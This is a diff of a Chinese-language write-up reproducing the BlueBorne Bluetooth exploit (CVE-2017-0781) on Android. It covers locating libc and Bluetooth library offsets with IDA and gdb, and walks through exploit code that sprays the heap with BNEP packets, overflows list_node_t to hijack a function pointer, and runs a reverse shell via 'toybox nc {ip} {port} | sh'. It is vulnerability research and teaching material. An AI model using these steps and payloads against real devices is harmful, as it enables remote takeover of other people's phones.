@@ -263,7 +263,7 @@ BSS_ACL_REMOTE_NAME_OFFSET = 0x202ee4
 BLUETOOTH_BSS_SOME_VAR_OFFSET = 0x14b244
 ```
 
-需要从手机中拖出来so文件，用ida解析去找到对应的偏移，有两个还需要动态调试去找，所以手机需要先root
+需要从手机中拖出来so文件，用ida解析去找到对应的偏移，system的偏移可以用ida找到，其他两个还需要动态调试去找，所以手机需要先root
 
 可以使用以下命令将so文件拖出来
 ```
@@ -274,3 +274,253 @@ adb pull /system/lib/libc.so
 然后用ida打开libc.so文件, 在函数栏找到system函数
 
 ![](./BlueBorne蓝牙漏洞复现/tt4.png)
+
+将硬编码的偏移替换为0x45EF0
+```
+#LIBC_TEXT_STSTEM_OFFSET = 0x45EF0 + 1
+```
+
+之后就需要动态调试了
+
+
+#### 动态调试
+
+首先从github上面下载一个静态链接的arm [gdbserver](https://github.com/marcinguy/arm-gdb-static/raw/master/gdbserver)
+
+然后用adb将其传到手机上面，顺便加个权限，映射一下端口
+
+```
+adb push ./gdbserver /data/local/tmp
+adb shell chmod 777 /data/local/tmp/gdbserver
+adb forward tcp:8798 tcp:8798
+```
+
+然后用ps找到bluetooth进程
+```
+adb shell ps |grep bluetooth
+```
+
+返回例子如下
+
+```
+$ adb shell ps |grep bluetooth
+bluetooth 7277  480   1045228 53376 ptrace_sto 0000000000 t com.android.bluetooth
+bluetooth 7310  1     16588  1724  poll_sched 0000000000 S /system/bin/wcnss_filter
+```
+
+这个例子的pid为7277
+
+然后先进入adb shell，输入su变成root，再使用gdbserver进行attach
+```
+adb shell
+su
+```
+```
+/data/local/tmp/gdbserver --attach 0.0.0.0:8798 7277
+```
+
+之后再使用gdb-multiarch去连接，进行调试
+```
+gdb-multiarch
+target remote 127.0.0.1:8798
+```
+
+这样就能成功的进行调试
+
+#### 动态调试寻找偏移
+
+首先在脚本里面插入print语句，输出下面这两个变量的值
+```
+    # Calculate according to known libc.so and bluetooth.default.so binaries
+    likely_some_libc_blx_offset = result[-3][-2]
+    likely_some_bluetooth_default_global_var_offset = result[6][0]
+    print(hex(likely_some_libc_blx_offset),hex(likely_some_bluetooth_default_global_var_offset)) #例子
+```
+
+然后进入adb shell，用su变成root，之后使用下面的命令找到libc和bluetooth.default.so的基址
+
+```
+# cat /proc/7277/maps |grep libc.so
+e9f9f000-ea023000 r-xp 00000000 103:09 1342                              /system/lib/libc.so ; 0xe9f9f00就是libc的基址
+ea023000-ea027000 r--p 00083000 103:09 1342                              /system/lib/libc.so
+ea027000-ea029000 rw-p 00087000 103:09 1342                              /system/lib/libc.so
+```
+
+```
+# cat /proc/7277/maps |grep bluetooth.default
+e835c000-e848f000 r-xp 00000000 103:09 1278                              /system/lib/hw/bluetooth.default.so ; 0xe835c000就是so文件的基址
+e8490000-e8493000 r--p 00133000 103:09 1278                              /system/lib/hw/bluetooth.default.so
+e8493000-e8494000 rw-p 00136000 103:09 1278                              /system/lib/hw/bluetooth.default.so
+```
+
+根据exp输出的两个变量和找到的基址，计算偏移，修改LIBC_SOME_BLX_OFFSET和BLUETOOTH_BSS_SOME_VAR_OFFSET的偏移
+
+但是如果尝试几次，偏移不固定的话，可以修改这里面的下标，找一个比较稳定的
+```
+    likely_some_libc_blx_offset = result[-3][-2]
+    likely_some_bluetooth_default_global_var_offset = result[6][0]
+```
+
+剩下还有一个BSS_ACL_REMOTE_NAME_OFFSET，这个偏移需要使用find去遍历内存找
+
+首先执行doit脚本，将bluetooth进程弄crash，这个时候gdb还没退出，然后可以遍历一下找到对应的位置
+
+下面是在so文件内存附近寻找toybox这个字符串的命令
+```
+$ find 0xe835c000,0xe8f5c000,{char[6]}"toybox"
+0xe8556c4b
+warning: Unable to access 16000 bytes of target memory at 0xe856e351, halting search.
+1 pattern found.
+```
+
+返回的地址0xe8556c4b减去0xf，再减去so基址，就是BSS_ACL_REMOTE_NAME_OFFSET
+这里是
+```
+BSS_ACL_REMOTE_NAME_OFFSET=0xe8556c4b-0xf-0xe835c000
+```
+
+#### 利用
+
+将上面几个偏移找好之后，要将手机和攻击的电脑连在同一个网络下面，这样才能拿到shell，当然你也可以指定别的ip，然后在上面监听1233端口
+
+利用成功的截图如下
+
+![](./BlueBorne蓝牙漏洞复现/exp.png)
+
+### 3.3 exp 分析
+
+除去前面泄露的部分，exp比较关键的部分如下
+
+```
+    # Each of these messages causes BNEP code to send 100 "command not understood" responses.
+    # This causes list_node_t allocations on the heap (one per reponse) as items in the xmit_hold_q.
+    # These items are popped asynchronously to the arrival of our incoming messages (into hci_msg_q).
+    # Thus "holes" are created on the heap, allowing us to overflow a yet unhandled list_node of hci_msg_q.
+    for i in range(20):
+        bnep.send(binascii.unhexlify('8109' + '800109' * 100))
+
+    # Repeatedly trigger the vuln (overflow of 8 bytes) after an 8 byte size heap buffer.
+    # This is highly likely to fully overflow over instances of "list_node_t" which is exactly
+    # 8 bytes long (and is *constantly* used/allocated/freed on the heap).
+    # Eventually one overflow causes a call to happen to "btu_hci_msg_process" with "p_msg"
+    # under our control. ("btu_hci_msg_process" is called *constantly* with messages out of a list)
+    for i in range(1000):
+        # If we're blocking here, the daemon has crashed
+        _, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)
+        if not writeable:
+            break
+        bnep.send(binascii.unhexlify('810100') +
+                  struct.pack('<II', 0, acl_name_addr))
+    else:
+        log.info("Looks like it didn't crash. Possibly worked")
+```
+
+
+首先我们回忆下，前面提到，CVE-2017-0781这个漏洞可以堆溢出8个字节
+```
+        memcpy((uint8_t*)(p_bcb->p_pending_data + 1), p, rem_len);
+```
+
+但是具体怎么利用呢？因为堆溢出后面的内容不太可控，所以armis他们就选择了溢出只有8字节大小的list_node_t结构体
+
+结构体的定义如下
+```
+struct list_node_t {
+    struct list_node_t* next;
+    void* data;
+}
+```
+
+该结构体的第二个成员是个void型指针，可以根据用途转化为其他类型的指针
+
+而恰好在btu_hci_msg_process函数中会将list_node_t结构体的data成员强制转化为post_to_task_hack_t结构体类型，如下所示：
+
+
+![](./BlueBorne蓝牙漏洞复现/tt5.png)
+
+而post_to_task_hack_t则包含的是一个函数指针：
+
+
+![](./BlueBorne蓝牙漏洞复现/tt6.png)
+
+因此，armis的exploit通过溢出list_node_t结构体可以直接控制堆上的函数指针，从而达到劫持进程执行的目的。list_node_t结构体到p_msg参数的转换则是在btu_hci_msg_ready函数中进行的，如下所示：
+
+![](./BlueBorne蓝牙漏洞复现/tt7.png)
+
+fixed_queue_dequeue函数从队列中出队一个list_node_t结构体，然后转换为p_msg参数传递到btu_hci_msg_process函数进行处理。因此，只要能够控制堆上的list_node_t结构体，就能够在btu_hci_msg_process函数执行时劫持进程。armis的exploit也是通过大量堆喷去实现覆盖list_node_t结构体。具体的部分就是
+
+```
+    for i in range(20):
+        bnep.send(binascii.unhexlify('8109' + '800109' * 100))
+```
+
+这里上面每一次send，都会造成bnep生成100个"command not understood"回应报文，然后导致在堆上生成一大堆list_node_t结构体
+
+这些回应报文会异步的去发送，所以我们可以在此期间利用溢出8个字节的漏洞，对这些list_node_t结构体进行溢出，就是如下这段代码
+
+
+```
+for i in range(1000):
+        # If we're blocking here, the daemon has crashed
+        _, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)
+        if not writeable:
+            break
+        bnep.send(binascii.unhexlify('810100') +
+                  struct.pack('<II', 0, acl_name_addr))
+    else:
+        log.info("Looks like it didn't crash. Possibly worked")
+```
+
+
+但是这里其实还有一个问题需要解决，溢出的data指针指向哪里？
+
+这里armis利用了蓝牙客户端的名字，在蓝牙协议的通信过程中，名字会被存储到so文件的bss段中，位置相对固定
+
+因此可以直接找出来，然后顺便还把注入的命令也放进去了
+
+
+```
+SHELL_SCRIPT = b'toybox nc {ip} {port} | sh'
+
+
+def set_bt_name(payload, src_hci, src, dst):
+    # Create raw HCI sock to set our BT name
+    raw_sock = bt.hci_open_dev(bt.hci_devid(src_hci))
+    flt = bt.hci_filter_new()
+    bt.hci_filter_all_ptypes(flt)
+    bt.hci_filter_all_events(flt)
+    raw_sock.setsockopt(bt.SOL_HCI, bt.HCI_FILTER, flt)
+
+    # Send raw HCI command to our controller to change the BT name (first 3 bytes are padding for alignment)
+    raw_sock.sendall(binascii.unhexlify('01130cf8cccccc') + payload.ljust(MAX_BT_NAME, b'\x00'))
+    raw_sock.close()
+    #time.sleep(1)
+    time.sleep(0.1)
+
+    # Connect to BNEP to "refresh" the name (does auth)
+    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+    bnep.bind((src, 0))
+    bnep.connect((dst, BNEP_PSM))
+    bnep.close()
+
+    # Close ACL connection
+    os.system('hcitool dc %s' % (dst,))
+...
+...
+...
+def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base):
+    ...
+    ...
+    payload = struct.pack('<III', 0xAAAA1722, 0x41414141, system_addr) + b'";\n' + \
+                          SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT) + b'\n#'
+
+    assert len(payload) < MAX_BT_NAME
+    assert b'\x00' not in payload
+
+    # Puts payload into a known bss location (once we create a BNEP connection).
+    set_bt_name(payload, src_hci, src, dst)
+    ...
+    ...
+```
+
+
